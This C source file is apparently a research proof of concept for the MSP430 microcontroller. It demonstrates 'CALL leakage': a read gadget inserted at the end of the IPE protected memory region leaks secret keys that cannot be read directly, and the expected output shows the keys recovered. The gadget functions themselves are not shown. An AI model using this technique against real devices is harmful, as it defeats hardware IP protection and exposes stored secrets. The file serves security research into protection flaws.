/**
 * CALL leakage v1: inserting a universal read gadget to the end of the IPE region.
 *
 * After launching the debug session, do a hard reset (to activate IPE), then run the code.
 *
 * Expected output:
 * ----------------
 * Reading key directly:
 * Key: 3fff
 * Key: 3fff
 * Key: 3fff
 * Key: 3fff
 * Key: 3fff
 * Leaked: 123
 * Leaked: 4567
 * Leaked: 89ab
 * Leaked: cdef
 * Leaked: aaaa
 * ----------------
 */

#include <msp430.h>
#include <stdint.h>
#include <stdio.h>

#pragma DATA_SECTION(IPE_encapsulatedCount, ".ipe_vars")
uint8_t IPE_encapsulatedCount;

#pragma DATA_SECTION(IPE_i, ".ipe_vars")
uint8_t IPE_i;

#pragma DATA_SECTION(IPE_encapsulatedKeys, ".ipe_const")
const uint16_t IPE_encapsulatedKeys[] = {0x0123, 0x4567, 0x89AB, 0xCDEF,
                                         0xAAAA, 0xBBBB, 0xCCCC, 0xDDDD};

void IPE_encapsulatedInit(void);
void IPE_encapsulatedBlink(void);

void make_steal_gadget();
void make_ret_gadget();
void use_gadget();

extern uint16_t buffer;

uint16_t *pb = &buffer;

#pragma PERSISTENT(otherFramVar)
uint8_t otherFramVar = 0;

void main(void) {
    int i;
    WDTCTL = WDTPW | WDTHOLD;  // Stop watchdog timer

    puts("Reading key directly:\n");
    for (i = 0; i < 5; ++i) {
        printf("Key: %x\n", IPE_encapsulatedKeys[i]);
    }

    make_steal_gadget();
    use_gadget();
    for (i = 0; i < 5; ++i) {
        printf("Leaked: %x\n", pb[i]);
    }

    while (1) {
        __no_operation();
    }
}

#pragma CODE_SECTION(IPE_encapsulatedInit, ".ipe")
void IPE_encapsulatedInit(void)
{
    IPE_encapsulatedCount = 1;
}

#pragma CODE_SECTION(IPE_encapsulatedBlink, ".ipe")
void IPE_encapsulatedBlink(void)
{
    __no_operation();
}

#pragma CODE_SECTION(TIMER0_A0_ISR, ".ipe:_isr")
#pragma vector=TIMER0_A0_VECTOR
__interrupt
void TIMER0_A0_ISR(void)
{
    __bic_SR_register_on_exit(LPM0_bits); //Wake the device on ISR exit
    __no_operation();
}
